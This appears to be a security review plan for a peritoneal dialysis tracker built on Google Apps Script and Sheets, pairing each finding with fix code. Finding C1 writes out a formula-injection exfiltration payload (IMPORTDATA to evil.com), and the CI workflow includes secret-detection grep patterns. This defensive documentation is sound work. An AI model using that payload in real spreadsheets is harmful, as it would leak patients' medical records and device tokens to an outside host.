# PD Tracker — Security Plan

> **Status:** Draft — for review and implementation  
> **Scope:** GitHub Pages frontend + Google Apps Script backend + Google Sheets storage  
> **Auth pattern:** Pattern B — per-device UUID tokens (PDManagement pattern)  
> **Data sensitivity:** Medical (peritoneal dialysis records, vitals, patient identifiers)

---

## 1. Executive Summary

The PD Tracker has a well-conceived architecture (gitignored secrets, per-device token auth, readonly token support, CI deployment). Several critical and high-severity gaps exist that must be addressed before the app is considered production-secure. Highest-priority issues:

1. **Formula injection** — `sanitiseForSheet()` doesn't exist; all string data written to sheets is unprotected
2. **`doPost` crashes on malformed requests** — `e.postData` null guard missing
3. **`loginOrRegister` has no rate limiting** — Tokens sheet can be flooded
4. **Error handlers leak raw GAS/Sheets exception messages** — internal infrastructure exposed
5. **`validateToken` / `loginOrRegister` column-range bug** — TextSize preference never applied
6. **Plan fix C6: CSP `connect-src` missing `script.googleusercontent.com`** — implementing H5 as originally written would silently break all API calls
7. **Plan fix C7: `isRateLimited` `finally` block crashes on lock timeout** — implementing Section 5 as originally written would crash the handler on lock contention instead of failing open

---

## 2. Findings

### 2.1 Critical

---

**C1 — Formula Injection: No `sanitiseForSheet()` in Code.gs**

> 💬 **What this means:** Imagine you're a bank teller and someone hands you a deposit slip. You copy whatever's written on it directly into your ledger. If instead of "€500" they wrote a small program — `=SEND_ALL_ACCOUNTS_TO_ATTACKER` — and your ledger software ran it automatically, that's exactly what happens here. Google Sheets treats any cell value starting with `=`, `+`, `-`, or `@` as a formula and executes it. Your app saves whatever the user typed (bag notes, patient name, item names) directly into the sheet without checking. Someone could type `=IMPORTDATA("https://evil.com/?data="&A1)` into the notes field, and the sheet would silently send your entire spreadsheet — including all device tokens and patient records — to an attacker's server every time the sheet is opened. They don't need to hack anything — just tap the notes field and type a formula.

- **File:** `apps-script/Code.gs` — `logMeasurement`, `updateInventory`, `addPatient`, `editPatient`
- **Impact:** Any string value written to a sheet that begins with `=`, `+`, `-`, or `@` is evaluated as a formula. An attacker controlling `date`, `time`, `notes`, `bagType`, `name`, `comment`, or `item.name` can submit `=IMPORTDATA("https://evil.com/?d="&A1)` and silently exfiltrate the entire spreadsheet — including all device tokens, patient data, and password hashes. Note: numeric fields (`weight`, `bpSystolic`, etc.) coerced through `parseFloat`/`parseInt` are safe because the coercion discards any non-numeric prefix before it reaches the sheet.
- **Evidence:** `sanitiseForSheet()` does not exist anywhere in `Code.gs`. No sanitisation applied before any `appendRow` or `setValue` call.

**Fix:** Add `sanitiseForSheet()` and apply it to every user-controlled string before any sheet write.

```javascript
// Add to Code.gs — apply before every user-controlled sheet write.
// Trigger characters verified for Google Sheets: = + - @
// Do NOT include \t or \r — those are not formula triggers.
function sanitiseForSheet(value) {
  var s = String(value === null || value === undefined ? '' : value);
  if (s.length > 0 && '=+-@'.indexOf(s[0]) !== -1) {
    return "'" + s; // leading apostrophe forces plain-text treatment
  }
  return s;
}
```

Apply in `logMeasurement`:
```javascript
function logMeasurement(data) {
  var sheet    = getSheet(TAB.MEASUREMENTS);
  var docLock  = LockService.getDocumentLock();
  var acquired = false;
  try {
    docLock.waitForLock(10000); // throws LockTimeoutException after 10s
    acquired = true;
    sheet.appendRow([
      sanitiseForSheet(String(data.date || '').slice(0, 30)),
      sanitiseForSheet(String(data.time || '').slice(0, 15)),
      parseFloat(data.weight)      || '',
      parseInt(data.bpSystolic)    || '',
      parseInt(data.bpDiastolic)   || '',
      parseFloat(data.bagWeight)   || '',
      sanitiseForSheet(String(data.notes           || '').slice(0, 500)),
      sanitiseForSheet(String(data.bagType         || '').slice(0, 50)),
      sanitiseForSheet(String(data.measurementType || '').slice(0, 30)),
      sanitiseForSheet(String(data.patientId       || '').slice(0, 50)),
      parseFloat(data.fillVolume)  || '',
      sanitiseForSheet(String(data.token           || '').slice(0, 50))
    ]);
    SpreadsheetApp.flush();
    _touchDataLastUpdated(); // must be called inside the lock — it writes to Config sheet
  } finally {
    if (acquired) docLock.releaseLock();
    // Per GAS docs, releaseLock() throws if the lock is not held — same trap as C7.
    // Unlike isRateLimited (which fails OPEN), document locks intentionally fail CLOSED:
    // if the lock times out, the write is aborted and doPost returns { error: 'Internal error' }.
    // This is the correct behaviour — never write data without lock protection.
  }
  return { success: true, message: 'Measurement logged.' };
}
```

> **`_touchDataLastUpdated()` note:** This function does a read-modify-write on the Config sheet. It must always be called while the document lock is held. Never call it from outside a `LockService.getDocumentLock()` block. Apply the same `acquired` flag + `finally { if (acquired) releaseLock() }` pattern to `updateInventory`, `addPatient`, `editPatient`, and `loginOrRegister` (see H1).

Apply in `updateInventory` — acquire the lock once outside the loop, not per-item:
```javascript
function updateInventory(data) {
  var sheet    = getSheet(TAB.INVENTORY);
  var docLock  = LockService.getDocumentLock();
  var acquired = false;
  try {
    docLock.waitForLock(10000);
    acquired = true;
    var items    = Array.isArray(data.items) ? data.items : [];
    var datetime = data.datetime || '';
    items.forEach(function(item) {
      sheet.appendRow([
        sanitiseForSheet(String(datetime       || '').slice(0, 30)),
        sanitiseForSheet(String(item.name      || '').slice(0, 100)),
        parseInt(item.count) || 0,
        sanitiseForSheet(String(data.patientId || '').slice(0, 50)),
        sanitiseForSheet(String(data.token     || '').slice(0, 50))
      ]);
    });
    SpreadsheetApp.flush();
    // NOTE: _touchDataLastUpdated() is intentionally absent here if the original Code.gs
    // doesn't call it in updateInventory. If clients cache inventory state and need to
    // be notified of changes, add: _touchDataLastUpdated(); after SpreadsheetApp.flush().
    // Verify against the original Code.gs and add it here if other write functions call it.
  } finally {
    if (acquired) docLock.releaseLock();
  }
  return { success: true };
}
```

> **Lock placement:** The document lock wraps the entire forEach, not each individual `appendRow` — one lock acquisition for the whole batch. Acquiring and releasing the lock per row wastes quota and causes unnecessary contention.

Apply in `addPatient` — wrap the full function with a document lock:
```javascript
function addPatient(data) {
  var sheet    = getSheet(TAB.PATIENTS);
  var docLock  = LockService.getDocumentLock();
  var acquired = false;
  try {
    docLock.waitForLock(10000);
    acquired = true;
    var now       = new Date().toISOString();
    var patientId = Utilities.getUuid();
    sheet.appendRow([
      patientId,
      sanitiseForSheet(String(data.name    || '').slice(0, 100)),
      sanitiseForSheet(String(data.dob     || '').slice(0, 15)),
      sanitiseForSheet(String(data.comment || '').slice(0, 500)),
      'TRUE',
      now
    ]);
    SpreadsheetApp.flush();
    _touchDataLastUpdated(); // must be inside the lock
  } finally {
    if (acquired) docLock.releaseLock();
  }
  return { success: true, patientId: patientId };
}
```

Apply in `editPatient`:
```javascript
if (data.name    !== undefined) sheet.getRange(r, 2).setValue(sanitiseForSheet(String(data.name).slice(0, 100)));
if (data.dob     !== undefined) sheet.getRange(r, 3).setValue(sanitiseForSheet(String(data.dob).slice(0, 15)));
if (data.comment !== undefined) sheet.getRange(r, 4).setValue(sanitiseForSheet(String(data.comment).slice(0, 500)));
```

> **Read-back note:** The leading apostrophe is NOT returned when reading a cell value back via `getValue()`. The current Code.gs GET handlers (`getDashboard`, `getHistory`) read cells and return them to the frontend, which escapes output with `escHtml()` — so the current code is not vulnerable to read-back exploitation. This note applies to any future handler that reads previously sanitised cells and uses the value as code input (e.g., in a formula, `eval()`, or URL construction).

---

**C2 — `doPost`: `e.postData` Null Guard Missing + No Body Size Limit**

> 💬 **What this means:** Your server's front door expects visitors to hand over a package (the request body). But if someone rings the bell and hands over nothing — or a 50 MB crate — the door code crashes before it can do anything useful. A malicious caller can send thousands of empty or enormous requests, exhausting your daily 20,000-request GAS quota and taking the app down for everyone, at zero cost to them.

- **File:** `apps-script/Code.gs` line 58
- **Impact:** A malformed request with no body causes `e.postData.contents` to throw a null dereference. No upper bound on request body size — a multi-megabyte payload exhausts execution time and GAS quota.
- **Evidence:** `body = JSON.parse(e.postData.contents)` — no null guard, no length check.

**Fix:** Replace `doPost` with the canonical template (see Section 4).

---

**C3 — `loginOrRegister` Not Rate-Limited**

> 💬 **What this means:** The "register a new device" action requires no existing account — anyone can call it from anywhere. There's nothing stopping a script from calling it 10,000 times in a row with different device names. This floods your Tokens sheet with thousands of junk rows, and every one of those requests counts against your 20,000 requests/day free tier limit. Once the limit is hit, the app goes dark for everyone — the real patient can't log measurements, can't check their dashboard — for the rest of that day.

- **File:** `apps-script/Code.gs` line 65
- **Impact:** `loginOrRegister` is the only public POST action. An attacker can flood it with junk registrations, filling the Tokens sheet with thousands of rows and exhausting the 20,000 req/day GAS quota. The canonical `doPost` template (Section 4) adds `isRateLimited('pub_reg')` before this action — but `isRateLimited` must also be added (see Section 5).

---

**C4 — Error Handlers Leak Raw Exception Messages**

> 💬 **What this means:** When something goes wrong, your server currently sends back the raw error message from Google. This is like a restaurant's "sorry, we're busy" sign accidentally showing the full kitchen layout, staff names, and supply contracts. The errors say things like *"Sheet not found: Daily_Measurements"* (attacker now knows your exact sheet name), *"Service Spreadsheets failed while accessing document ID: 1BxG..."* (leaks your spreadsheet ID), and *"Quota exceeded"* (tells an attacker their attack is working and to slow down). Good security says: show the user only what they need — "something went wrong" — not a map of your internals.

- **File:** `apps-script/Code.gs` — three locations:
  - Line 51: `doGet` catch block → `return jsonResponse({ error: err.message })`
  - Line 59: `doPost` inner JSON-parse catch → `return jsonResponse({ error: 'Invalid JSON body: ' + err.message })` — **also leaks**
  - Line 75: `doPost` outer catch block → `return jsonResponse({ error: err.message })`
- **Current:** All three return raw GAS/Sheets exception text verbatim.
- **Impact:** GAS/Sheets API error messages reveal internal details: `"Sheet not found: Daily_Measurements"`, `"Service Spreadsheets failed while accessing document ID: 1BxG..."`, `"Quota exceeded for quota metric 'write_requests'"`. This tells an attacker the exact sheet structure, document ID prefix, and quota status.
- **Fix:** All three are resolved by replacing `doGet` and `doPost` with the canonical templates in Sections 2.2 H2 and Section 4. The doGet template uses the safe two-branch error pattern; the doPost template wraps the JSON parse catch with `return jsonResponse({ error: 'Invalid request' })` and the outer catch with the Unauthorized/Internal error pattern.

> ⚠️ **UX regression to handle:** After this fix, `loginOrRegister` validation exceptions (`'Label is required'`, `'Password is required'`, `'No token provided'`) fall into the outer catch and become `'Internal error'`. The frontend currently displays these messages to the user. **Fix:** Convert `loginOrRegister`'s input validation from `throw` to `return { error: 'Invalid request' }` so validation failures return cleanly without being caught as exceptions:
> ```javascript
> function loginOrRegister(label, passwordHash, newUUID) {
>   if (!label || !passwordHash || !newUUID) return { error: 'Invalid request' };
>   if (String(newUUID).length > 100)        return { error: 'Invalid request' };
>   // ... rest of function
> }
> ```
> The doPost template calls `return jsonResponse(loginOrRegister(...))` — a returned `{ error: ... }` is passed through to the client correctly without going through the catch block.

---

**C5 — `validateToken` / `loginOrRegister` Column-Range Bug (TextSize Never Read)**

> 💬 **What this means:** Your Tokens spreadsheet has 10 columns. The code that reads back a token's saved preferences asks for columns 1 through 9 — but text size preference is in column 10. It's like asking someone to read you the first nine items on a shopping list when text size is item 10 — you'll never hear it. The app dutifully saves your text size choice, but every time you restart the app it forgets it, because reading only goes up to 9. No security exploit here — it's just a silent data bug that means text size preferences have never actually worked on login.

- **File:** `apps-script/Code.gs` lines 446 and 476
- **Impact:** Both functions call `getRange(2, 1, ..., 9)` — reading columns 1–9. The Tokens sheet has 10 columns (Token, Label, Status, Created, Last Used, PasswordHash, ActivePatientID, Theme, Language, **TextSize**). TextSize is column 10, index 9 in the returned array — but the range only covers indices 0–8. `rows[i][9]` is always `undefined`. TextSize preferences are silently never applied on login or token validation.
- **Scope clarification:** `savePreferences` correctly writes to column 10 (`sheet.getRange(r, 10).setValue(data.textSize)`) — the bug is read-only. TextSize is saved correctly but never returned to the client.

**Fix:** One occurrence in each function (not two — the plan previously overstated this):
```javascript
// In validateToken (line 446) — one occurrence:
var rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, 9).getValues();
// → change to:
var rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, 10).getValues();

// In loginOrRegister (line 476) — one occurrence:
var rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, 9).getValues();
// → change to:
var rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, 10).getValues();
```

---

**C6 — CSP `connect-src` Redirect Chain: `script.googleusercontent.com` Missing**

> 💬 **What this means:** This is a bug in the security plan itself — not in your current code. The plan (H5) recommends adding a Content Security Policy that says "this page is only allowed to connect to `script.google.com`." But when your app calls the Google Apps Script backend, Google immediately redirects the request to a different address: `script.googleusercontent.com`. The browser enforces the policy on both the original address and where it gets redirected — and since `googleusercontent.com` wasn't on the approved list, the browser would block it silently. Your entire app would stop talking to the backend with no visible error. Every API call — load dashboard, log measurement, everything — would fail. Implementing the plan as originally written would have broken the app worse than leaving it insecure.

- **Found in:** Review Pass 11 (browser security expert) — this is a plan-level fix, not a code bug that exists today.
- **File:** H5 CSP fix in this plan (the `<meta>` tag as originally written).
- **Impact:** GAS web app requests to `https://script.google.com/macros/s/.../exec` are served via an HTTP redirect to `https://script.googleusercontent.com/...`. CSP `connect-src` is enforced against both the initial URL **and** the redirect destination. Adding CSP with only `connect-src 'self' https://script.google.com` would block the redirect response — **silently breaking every API call** in the app, with no console error visible to the user.
- **Evidence:** GAS `/exec` endpoints return HTTP 302 to `*.googleusercontent.com`. Confirmed by browser network tab inspection of any GAS web app request.

**Fix:** Add `https://script.googleusercontent.com` to `connect-src` in H5:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src  'self' 'unsafe-inline';
  style-src   'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src    'self' https://fonts.gstatic.com;
  connect-src 'self' https://script.google.com https://script.googleusercontent.com;
  img-src     'self' data:;
  frame-ancestors 'none';
">
```

---

**C7 — `isRateLimited` `finally` Block Throws on Lock Timeout**

> 💬 **What this means:** This is another bug in the plan's own code. Rate limiting uses a "lock" — a mechanism that makes sure only one request can check-and-update the counter at a time, like a single toilet key at a café. The plan's code said: when you're done, always return the key (call `releaseLock()`). But if you never got the key in the first place (because it was busy for too long), Google says "you can't return a key you don't have" and throws an error. The plan meant "if you can't get the key, just let the request through quietly" — but instead, the error from trying to return a key you never had would crash the whole request and return an error to the user. The rate limiting safety feature would itself take down the app under any load. Fixed by checking whether we actually got the lock before trying to return it.

- **Found in:** Review Pass 16 (first-time implementer) — this is a plan-level fix for Section 5 code.
- **File:** Section 5 of this plan (`isRateLimited` implementation).
- **Impact:** When `lock.waitForLock(3000)` throws `LockTimeoutException`, the `catch` block runs (sets `limited = false`) and then the `finally` block runs `lock.releaseLock()`. Per GAS docs, `releaseLock()` throws if the lock is not currently held. The `finally` exception propagates **after** `catch` has already run — so the function throws instead of returning `false`. The caller (`doPost`/`doGet`) catches this exception in its own try/catch and returns `{ error: 'Internal error' }`. Every request that hits a contended lock returns an error, rather than proceeding normally. The rate limit intended as a protective layer instead takes the app down under load.

**Fix:** Track lock acquisition with a boolean flag. See **Section 5** for the complete, authoritative implementation (which also integrates the per-day counter from M10). The minimal fix for this specific bug is:

```javascript
// MINIMAL FIX FOR C7 ONLY — use Section 5 for the full implementation
var acquired = false;
try {
  lock.waitForLock(3000);
  acquired = true;
  // ... rate limit logic ...
} catch (_) {
  limited = false;
} finally {
  if (acquired) lock.releaseLock(); // only release if we actually acquired it
}
```

> ⚠️ **Use Section 5, not this snippet.** The full `isRateLimited` in Section 5 includes both the `acquired` flag fix (C7) and the per-day counter (M10). Do not implement from this snippet alone.

---

### 2.2 High

---

**H1 — No Sheet Write Locks (Race Condition on Concurrent Requests)**

> 💬 **What this means:** Your backend runs in Google's cloud and handles multiple requests at the same time. Imagine two family members log a measurement at the exact same second. Both requests run simultaneously, both ask "what's the last row in this sheet?" and both get back "row 47." Both then write their data to row 48 — overwriting each other. One measurement silently disappears. Or two new devices register at the same instant and both get assigned the same row. It's like two waiters simultaneously picking up the same order ticket: one customer gets served twice, another gets nothing. A "lock" makes each request wait its turn before touching the sheet — like a physical key that only one person can hold at a time.

- **File:** `apps-script/Code.gs` — `logMeasurement`, `updateInventory`, `addPatient`, `editPatient`, `loginOrRegister`
- **Impact:** GAS executes concurrent web app requests in parallel. Two simultaneous writes can both read the same "last row" and overwrite each other, or `loginOrRegister` can register the same label twice. `editPatient` does a full-sheet read followed by targeted cell writes — both steps must be inside the lock to prevent a race where two concurrent edits read the same row index and overwrite each other. `_touchDataLastUpdated()` also does an unprotected read-modify-write on the Config sheet.

**Fix:** Wrap all sheet read-modify-write operations with `LockService.getDocumentLock()`. See the `logMeasurement` example in C1 above (which includes the `acquired` flag pattern). Apply the same pattern to `updateInventory`, `addPatient`, `editPatient`, and `loginOrRegister`.

`editPatient` — C1 shows only the inner `setValue` calls; the full function lock wrapper:
```javascript
function editPatient(data) {
  var sheet    = getSheet(TAB.PATIENTS);
  var docLock  = LockService.getDocumentLock();
  var acquired = false;
  try {
    docLock.waitForLock(10000);
    acquired = true;
    // Read all rows inside the lock to prevent TOCTOU: another request could insert/delete
    // rows between our read and write, shifting row indices and corrupting data.
    var rows = sheet.getRange(2, 1, Math.max(sheet.getLastRow() - 1, 1), 5).getValues();
    var r = -1;
    for (var i = 0; i < rows.length; i++) {
      if (String(rows[i][0]) === String(data.patientId)) { r = i + 2; break; }
    }
    if (r === -1) throw new Error('Patient not found'); // H4 fix: no patientId in message
    if (data.name    !== undefined) sheet.getRange(r, 2).setValue(sanitiseForSheet(String(data.name).slice(0, 100)));
    if (data.dob     !== undefined) sheet.getRange(r, 3).setValue(sanitiseForSheet(String(data.dob).slice(0, 15)));
    if (data.comment !== undefined) sheet.getRange(r, 4).setValue(sanitiseForSheet(String(data.comment).slice(0, 500)));
    if (data.active  !== undefined) sheet.getRange(r, 5).setValue(data.active === true || data.active === 'true' ? 'TRUE' : 'FALSE');
    SpreadsheetApp.flush();
    _touchDataLastUpdated(); // must be inside the lock
  } finally {
    if (acquired) docLock.releaseLock();
  }
  return { success: true };
}
```

`loginOrRegister` — also needs a lock wrapper (not shown in C1):
```javascript
function loginOrRegister(label, passwordHash, newUUID) {
  // ... validation ...
  var sheet    = ss().getSheetByName(TAB.TOKENS);
  var docLock  = LockService.getDocumentLock();
  var acquired = false;
  try {
    docLock.waitForLock(10000);
    acquired = true;
    // ... existing label+password lookup and appendRow logic ...
  } finally {
    if (acquired) docLock.releaseLock();
  }
}
```

> **Fail-closed vs fail-open:** Document locks are intentionally fail-CLOSED — if `waitForLock(10000)` throws, the write is aborted and `doPost` returns `{ error: 'Internal error' }`. This is correct: never write data without protection. This is the opposite of `isRateLimited` (C7), which is fail-OPEN (allows the request through if the lock is unavailable). Do not catch `LockTimeoutException` inside write functions to "continue anyway" — that defeats the entire purpose.

---

**H2 — No Rate Limiting on `doGet` Endpoints**

> 💬 **What this means:** Once a device is logged in with a valid token, it can call "load my dashboard" or "load history" as many times per second as it wants. A compromised device (or someone who stole a token) could write a script that hammers these endpoints thousands of times per minute — draining your 20,000 requests/day quota in minutes and shutting the app down for the real patient for the rest of that day. Rate limiting says: "You've made 30 requests in the last 60 seconds — slow down." Normal use never hits this limit; abuse does.

- **File:** `apps-script/Code.gs` — `doGet`
- **Impact:** Authenticated GET calls (`getDashboard`, `getHistory`, `getPatients`, etc.) have no rate limit. A valid token can call them thousands of times per minute, exhausting the 20,000 req/day GAS quota and taking the app down for all users.

**Fix:** Add per-token rate limiting in `doGet` after `checkToken`:

```javascript
function doGet(e) {
  var action = e.parameter.action;
  try {
    // Public actions — light global rate limit to prevent probing floods
    if (action === 'validateToken') {
      if (isRateLimited('pub_vtok')) return jsonResponse({ status: 'unknown' });
      return jsonResponse(validateToken(e.parameter.token));
    }
    if (action === 'touchToken') {
      if (isRateLimited('pub_touch')) return jsonResponse({ success: false });
      return jsonResponse(touchToken(e.parameter.token));
    }

    // Protected actions — auth + per-token rate limit
    checkToken(e.parameter.token, true);
    // Same key format as doPost — GET and POST share one per-minute counter per token.
    // See Section 4 comment for implications and the optional suffix workaround.
    if (isRateLimited(String(e.parameter.token).slice(-8))) {
      return jsonResponse({ error: 'Rate limit exceeded' });
    }

    // ⚠️ TODO H3: Replace these two lines with the BOLA-check blocks from H3 before deploying.
    // Using these single-line forms leaves getDashboard and getHistory BOLA-unprotected.
    if (action === 'getDashboard')   return jsonResponse(getDashboard(e.parameter.patientId));
    if (action === 'getHistory')     return jsonResponse(getHistory(e.parameter.patientId, e.parameter.from, e.parameter.to));
    if (action === 'getConfig')      return jsonResponse(getConfig());
    if (action === 'getPatients')    return jsonResponse(getPatients());
    if (action === 'getDataVersion') return jsonResponse(getDataVersion());
    return jsonResponse({ error: 'Unknown action' }); // don't echo action name (L1)

  } catch (err) {
    var msg = err.message === 'Unauthorized' ? 'Unauthorized' : 'Internal error';
    return jsonResponse({ error: msg });
  }
}
```

---

**H3 — BOLA: Any Valid Token Can Access Any Patient's Data**

> 💬 **What this means:** "BOLA" is a security term — Broken Object Level Authorization. Your app supports multiple patients. When a device asks for data, it sends a `patientId` saying "show me data for this patient." The server checks "do you have a valid login token?" but never checks "is this patient *yours*?" A device registered for Patient A can just change the `patientId` in the request and read Patient B's full medical history. It's like a hospital where having a valid visitor badge for Ward 1 lets you walk into any ward — because the check-in only asks "do you have a badge?" not "which ward is yours?" In a single-family app the risk is low (all devices belong to the same family). But for a medical app it should be locked down — especially if a caregiver device were ever compromised.

- **File:** `apps-script/Code.gs` — `getDashboard`, `getHistory` (reads); `logMeasurement`, `updateInventory`, `editPatient` (writes)
- **Impact:** `patientId` is accepted from the caller without verifying the calling token is authorised for that patient. Any approved token can request any patientId's medical records (read) or write data/modify records for any patient (write). Combined with `getPatients()` returning all patient IDs to any valid token, a compromised device token can enumerate all patients and access all of their data.
- **Context:** In the intended single-family deployment all devices are owned by the same family — practical risk is limited to a compromised device. For a medical app this should still be explicitly locked down. The check shown below covers the read path; the same pattern can be applied to write handlers if the design decision (D1) requires it.

**Fix:** Verify the requested `patientId` is authorised for the calling token. The Tokens sheet already has an `ActivePatientID` column (column 7):

> **Integration note:** The snippet below replaces the corresponding `getDashboard` and `getHistory` dispatch lines in the H2 `doGet` template. When implementing, substitute these expanded blocks for the single-line `return jsonResponse(getDashboard(...))` and `return jsonResponse(getHistory(...))` lines.

```javascript
// Add helper to Code.gs
function _getTokenPatientId(token) {
  var sheet = ss().getSheetByName(TAB.TOKENS);
  if (!sheet || sheet.getLastRow() <= 1) return null;
  var rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, 7).getValues();
  for (var i = 0; i < rows.length; i++) {
    if (String(rows[i][0]) === String(token)) {
      return rows[i][6] ? String(rows[i][6]) : null;
    }
  }
  return null;
}

// In doGet, replace the getDashboard and getHistory dispatch lines:
// NOTE: Both blocks declare 'requestedId' and 'tokenPatientId'. In GAS (JavaScript),
// duplicate var declarations in the same function are legal (vars are function-scoped,
// not block-scoped). Since the two if-branches are mutually exclusive (action is either
// 'getDashboard' or 'getHistory', never both), there is no functional bug. If you are
// using a linter, rename the variables in one block (e.g. 'histRequestedId') to silence
// the duplicate-declaration warning. V8 runtime users may also use 'let' instead of 'var'.
if (action === 'getDashboard') {
  var requestedId     = e.parameter.patientId;
  var tokenPatientId  = _getTokenPatientId(e.parameter.token);
  // Allow if: (a) token has no stored patient (setup phase) or (b) IDs match
  if (tokenPatientId && requestedId !== tokenPatientId) {
    return jsonResponse({ error: 'Unauthorized' });
  }
  return jsonResponse(getDashboard(requestedId));
}
if (action === 'getHistory') {
  var requestedId    = e.parameter.patientId;   // duplicate var declaration — see NOTE above
  var tokenPatientId = _getTokenPatientId(e.parameter.token);
  if (tokenPatientId && requestedId !== tokenPatientId) {
    return jsonResponse({ error: 'Unauthorized' });
  }
  return jsonResponse(getHistory(requestedId, e.parameter.from, e.parameter.to));
}
```

> **Design decision required:** If caregivers with `readonly` tokens should be able to view all patients (not just the patient in their token's `ActivePatientID`), this check must be conditionalised on token status. Document the intended access model before implementing.

> **Double Tokens sheet scan:** `_getTokenPatientId` reads the Tokens sheet independently, after `checkToken` → `validateToken` already read it. Each BOLA-protected GET reads the Tokens sheet twice. After C5 is fixed, `validateToken` already returns `activePatientId` in its result — a future optimisation is to thread this value through `checkToken` to avoid the second read. For a family app with a small Tokens sheet (~5 rows), the quota impact is negligible; for larger deployments it matters.

---

**H4 — `editPatient` Leaks patientId in Error Message**

> 💬 **What this means:** When you try to edit a patient that doesn't exist, the error message says "Patient not found: [the exact ID you sent]." A well-designed system gives the same generic response whether the patient exists or not — "Patient not found." Echoing the ID back confirms to a caller exactly which IDs are invalid, which slowly helps them build a picture of which ones are real. It's a small detail, but good security practice is to not confirm anything the caller shouldn't already know.

- **File:** `apps-script/Code.gs` line 640
- **Current:** `throw new Error('Patient not found: ' + data.patientId);`
- **Impact:** Confirms to a caller whether a specific patientId exists. For UUID patientIds the brute-force probability is negligible, but this still violates uniform error response principles and the `data.patientId` value is attacker-controlled.
- **Fix:** `throw new Error('Patient not found');`

---

**H5 — No Content Security Policy on index.html**

> 💬 **What this means:** A Content Security Policy (CSP) is a ruleset you hand to the browser: "This page is only allowed to run code from my own server, connect to these specific addresses, and load fonts from here." Without it, if a bad actor ever gets any JavaScript running on your page — through a compromised Google Fonts CDN, a browser extension gone rogue, or a future XSS vulnerability — that script can read your device token from localStorage and send it anywhere it wants. The CSP is like a whitelist posted at the door: "only our staff are allowed in, and they can only use the phone to call these numbers."
>
> There's a complication: your entire app uses `onclick="function()"` patterns inside dynamically generated HTML. A strict CSP would block those, silently breaking every button. So the near-term fix uses a slightly relaxed CSP that still blocks external scripts (the main threat) but allows your app's own inline code to keep working.

- **File:** `PDManagement/index.html`
- **Impact:** Device tokens stored in `localStorage` are accessible to any JavaScript running on the page. Without `script-src 'self'`, a single XSS vulnerability (compromised CDN, injected ad, etc.) steals all tokens.

**⚠️ Inline event handler constraint:** The entire app generates HTML with `onclick="functionName()"` via `innerHTML` throughout all render functions. CSP `script-src 'self'` **without `'unsafe-inline'` blocks inline event handlers set via `innerHTML`** — adding the strict CSP would silently break every interactive element in the app.

**Options (choose before implementing):**

| Option | Protection level | Effort |
|---|---|---|
| **A — Add `'unsafe-inline'` to script-src** | Partial: blocks external script injection; does not block XSS via innerHTML | Low (one line) |
| **B — Refactor onclick to addEventListener** | Strong: enables `script-src 'self'` without `'unsafe-inline'` | High (refactor all render functions) |
| **C — Move to a host with HTTP headers** | Maximum: nonce-based CSP, server-side rendering | Architectural change |

**Recommended near-term (Option A):** Add CSP with `'unsafe-inline'` on `script-src`. This still blocks externally sourced scripts (CDN compromise, `<script src="https://evil.com">`) and limits `connect-src`. It does not block XSS via `innerHTML`, but that attack requires an existing injection vector elsewhere.

```html
<!-- Add to <head> in index.html, before all script tags -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src  'self' 'unsafe-inline';
  style-src   'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src    'self' https://fonts.gstatic.com;
  connect-src 'self' https://script.google.com https://script.googleusercontent.com;
  img-src     'self' data:;
  frame-ancestors 'none';
">
```

> **Redirect chain:** GAS requests to `script.google.com/macros/s/.../exec` redirect to `script.googleusercontent.com`. CSP `connect-src` is enforced on both the initial URL and the redirect destination — both domains must be listed or all API calls will break silently. See C6.

> **Meta-tag CSP limitations (GitHub Pages):** `frame-ancestors` and `report-uri` are silently ignored when delivered via `<meta>` — these require HTTP response headers that GitHub Pages cannot set. The `script-src` and `connect-src` directives still apply and provide meaningful protection.

**Long-term (Option B):** Refactor all render functions to build DOM elements and attach handlers via `addEventListener` instead of `onclick` strings. This enables removal of `'unsafe-inline'` and full XSS protection.

---

**H6 — No Security CI Workflow (Secret Scanning)**

> 💬 **What this means:** Your `.gitignore` file tells git "never commit `config.js`" — and it works, as long as no one makes a mistake. But `.gitignore` only prevents *future* accidents. It doesn't alert you if someone accidentally commits a secret, or if a new file with a key in it gets added. And there's no automated check running on every push to look for patterns that shouldn't be there — like a GAS URL or a device token accidentally ending up in a committed file. A secret-scanning workflow is like a smoke detector: it doesn't prevent fires, but it tells you immediately if something is wrong so you can act before it spreads.

- **File:** `.github/workflows/` — only `deploy.yml` exists; no secret scanning
- **Impact:** A secret accidentally committed is not detected before GitHub indexes it.

**Fix:** Create `.github/workflows/security-scan.yml`:

> ⚠️ **Pin action SHAs before use (M7):** The tags below (`@v4`, `@v2`) are mutable — a compromised maintainer account could redirect them to malicious code that exfiltrates your CI secrets. Replace each tag with the SHA hash of the exact version you want. Look up current SHAs at `github.com/[owner]/[repo]/tags` and append as a comment. Example: `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2`. Do the same for `deploy.yml`.

```yaml
name: Security Scan

on:
  push:
  pull_request:
  workflow_dispatch:
  schedule:
    - cron: '0 3 * * 1'  # Weekly Monday 03:00 UTC

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      # PIN THIS TO A SHA HASH — see M7 note above
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # full git history required for secret scanning

      # PIN THIS TO A SHA HASH — see M7 note above
      - name: Detect secrets (Gitleaks)
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Check for hardcoded Apps Script URLs
        run: |
          if grep -rE "script\.google\.com/macros/s/[A-Za-z0-9_-]{20,}" \
            --include="*.js" --include="*.html" \
            --exclude="*.example" \
            --exclude-dir=".git" \
            .; then
            echo "ERROR: Hardcoded Apps Script URL found in source!"
            exit 1
          fi
          echo "OK: No hardcoded Apps Script URLs detected"

      - name: Check for hardcoded tokens or API keys
        run: |
          if grep -rE "(APPS_SCRIPT_TOKEN|device[_-]?token)\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}" \
            --include="*.js" --include="*.html" \
            --exclude="*.example" \
            --exclude-dir=".git" \
            .; then
            echo "ERROR: Possible hardcoded secret found!"
            exit 1
          fi
